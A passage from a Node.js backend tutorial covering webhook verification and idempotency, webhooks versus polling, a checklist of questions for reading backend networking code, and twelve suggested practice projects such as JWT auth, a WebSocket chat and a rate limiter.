        console.error('Webhook verification failed:', err);
        res.status(400).json({ error: 'Invalid signature' });
    }
});
```

## Webhook Best Practices

| Practice | Why |
|----------|-----|
| **Verify signature** | Ensure webhook is from trusted source |
| **Respond quickly (200)** | Provider may retry on non-200 |
| **Process async** | Don't block the response with heavy processing |
| **Idempotency** | Same event may be sent multiple times (deduplicate) |
| **Retry with backoff** | If processing fails, retry later |

```javascript
// Idempotency via event ID
const processedEvents = new Set();

app.post('/webhooks/stripe', async (req, res) => {
    const eventId = req.body.id;

    if (processedEvents.has(eventId)) {
        return res.status(200).json({ received: true }); // Already processed
    }

    processedEvents.add(eventId);

    // Process asynchronously
    setImmediate(() => processEvent(req.body));

    res.status(200).json({ received: true });
});
```

## Webhooks vs Polling

```
Polling:
Client                        Server
  │────── Any updates? ──────►│
  │◄───── No ─────────────────│
  │────── Any updates? ──────►│
  │◄───── No ─────────────────│
  │────── Any updates? ──────►│
  │◄───── Yes! ───────────────│
  (Wasteful: most checks return nothing)

Webhook:
Client                        Server
  │                            │ (Event occurs)
  │◄───── POST /webhook ──────│
  │────── 200 OK ────────────►│
  (Instant notification, no polling)
```

---

# PART XXIX — REVERSE ENGINEERING TACTICAL QUESTIONS

Whenever reading backend networking code ask:

---

### Who is client?

Browser, mobile app, another server, or CLI?

---

### Who is server?

Node.js, Nginx, cloud function, or third-party API?

---

### Which protocol?

HTTP, HTTPS, WebSocket, TCP, or UDP?

---

### HTTP or WebSocket?

Request-response or persistent connection?

---

### Which method?

GET, POST, PUT, PATCH, DELETE, or OPTIONS?

---

### Which status code?

2xx (success), 3xx (redirect), 4xx (client error), 5xx (server error)?

---

### Which headers matter?

Content-Type, Authorization, Cookie, Origin, Cache-Control?

---

### Is request authenticated?

JWT, session cookie, API key, or Basic Auth?

---

### Session or JWT?

Server-side state or client-side token?

---

### Cookie or Authorization header?

Cookie: automatic. Authorization: explicit.

---

### State stored where?

Server (session store) or client (JWT payload)?

---

### Is HTTPS used?

If not → man-in-the-middle risk.

---

### Is CORS involved?

Cross-origin request → check `Access-Control-Allow-Origin`.

---

### Which attack is possible?

XSS, CSRF, SQLi, MITM, brute force, replay?

---

### Which defense exists?

HttpOnly, SameSite, CSP, CSRF tokens, rate limiting, input validation?

---

### Cache hit or miss?

Check `Cache-Control`, `ETag`, `Last-Modified` headers.

---

### Is rate limiting required?

Auth endpoints, public APIs → yes.

---

### Is pagination needed?

Large datasets → yes.

---

### Is real-time communication required?

Chat, notifications, live updates → WebSocket or SSE.

---

### Is GraphQL better?

Flexible fields, single endpoint, avoiding over/under-fetching.

---

### Is REST better?

Simple, cacheable, versioned, well-understood.

---

### Which layer is bottleneck?

| Layer | Symptoms |
|-------|----------|
| **Network** | High latency, packet loss |
| **Database** | Slow queries, high CPU on DB |
| **CPU** | High `node` CPU usage |
| **Memory** | High RSS, frequent GC |

---

# Senior Reverse Coding Tactical Process

When seeing:

```javascript
app.get("/users", ...)
```

Ask:

1. **Which HTTP method?** GET, POST, PUT, PATCH, DELETE?
2. **Which resource?** `/users`, `/users/:id`, `/users/:id/orders`?
3. **Authentication needed?** Check for JWT middleware, session check.
4. **Rate limiting needed?** Is this a public/auth endpoint?
5. **Pagination needed?** Does this return a list? Could it have 1000+ items?
6. **Cache needed?** Does data change infrequently?
7. **Database query?** How many queries? N+1 problem? Indexes?
8. **Security risks?** Input validation? SQL injection? XSS?
9. **Response format?** JSON, HTML, XML, binary?
10. **Status codes?** 200 for success, 201 for create, 400 for bad input, 404 for not found, 500 for error?
11. **Error handling?** Try/catch? Error middleware? Consistent error format?
12. **Logging?** Request ID? Duration? Status code?
13. **Metrics?** Request count, latency, error rate?
14. **Versioning?** `/v1/users` or header-based?
15. **Scalability concerns?** Will this handle 10 req/s? 1000? 100000?

---

# Projects

## 1. REST API

Build a complete REST API for a resource (e.g., blog posts, products, books).

- Full CRUD: `GET/POST/PUT/PATCH/DELETE`.
- Input validation.
- Proper status codes.
- Error handling middleware.
- Pagination.
- Search/filtering via query params.
- Environment variable configuration.

## 2. JWT Authentication System

- `POST /register` — create user with hashed password.
- `POST /login` — returns JWT.
- `GET /profile` — protected route, returns user info from JWT.
- `POST /refresh` — issue new access token.
- `POST /logout` — invalidate refresh token.
- Access token: 15 min expiry. Refresh token: 7 days.
- Blacklist revoked tokens.

## 3. Session Authentication System

- `POST /register` — create user.
- `POST /login` — create session, set cookie.
- `GET /profile` — read session from cookie.
- `POST /logout` — destroy session, clear cookie.
- Session store in Redis.
- Session expiration and cleanup.
- Concurrent session limit.

## 4. Chat Server (WebSocket)

- WebSocket server using `ws`.
- Join/leave rooms.
- Send messages to room.
- Broadcast to all users.
- User presence (online/offline).
- Message history (last 50 messages).
- Typing indicators.
- Rate limiting (max 30 messages/min per user).

## 5. GraphQL API

- Schema with `Query`, `Mutation`, `Subscription`.
- Resolvers with DataLoader for N+1 prevention.
- Authentication middleware.
- Input validation.
- Pagination (connection pattern).
- Real-time subscriptions with WebSocket.
- Apollo Server Express.

## 6. File Upload Service

- Upload single/multiple files.
- File type validation (MIME type check).
- File size limit.
- Virus scan integration (ClamAV).
- Thumbnail generation for images.
- Serve uploaded files.
- Delete files.
- Track upload progress.

## 7. Rate Limiter

- Implement Fixed Window and Sliding Window algorithms.
- Configurable per-route limits.
- Redis-backed for distributed rate limiting.
- Return `Retry-After` header.
- Return `X-RateLimit-Limit`, `X-RateLimit-Remaining`, `X-RateLimit-Reset` headers.
- Admin endpoint to view current limits.

## 8. API Gateway

- Route requests to multiple microservices.
- JWT verification at gateway level.
- Rate limiting.
- Request logging with correlation ID.
- Response aggregation (combine data from multiple services).
- Circuit breaker for failing services.
- Graceful degradation (return partial data).

## 9. Reverse Proxy Setup

- Configure Nginx as reverse proxy for a Node.js app.
- SSL termination (Let's Encrypt).
- Static file serving via Nginx.
- Gzip compression.
- Security headers.
- Load balancing across multiple Node instances.
- WebSocket proxying.

## 10. Real-time Notification System

- SSE endpoint for real-time notifications.
- User subscribes to notification channel.
- Admin panel to send notifications.
- Notification persistence in database.
- Unread count.
- Mark as read.
- SSE reconnection handling with `Last-Event-ID`.
- Optional WebSocket version.

## 11. OAuth Login

- Login with Google.
- Login with GitHub.
- Login with Facebook.
- Link/unlink social accounts.
- Profile picture from provider.
- Session management after OAuth login.
- Handle OAuth errors (denied, expired).

## 12. Caching Layer

- Redis cache middleware for Express.
- Cache GET responses with configurable TTL.
- Cache invalidation on POST/PUT/PATCH/DELETE.
- Cache tags (invalidate by group).
- Cache statistics (hit rate, memory usage).
- Conditional caching (cache only if slow).
- Cache warming on startup.

---

# Next Part (Part 15)

We enter one of the biggest sections of the entire JavaScript ecosystem:

# Databases and Data Engineering

Including absolutely everything:

- SQL
- PostgreSQL
- MySQL
- SQLite
- NoSQL
- MongoDB
- Redis
- Indexes
- Transactions
- ACID
- CAP theorem
- Replication
- Sharding
- ORM
- Prisma
- Query optimization
- Database internals
- Reverse engineering coding tactics used by senior backend engineers.
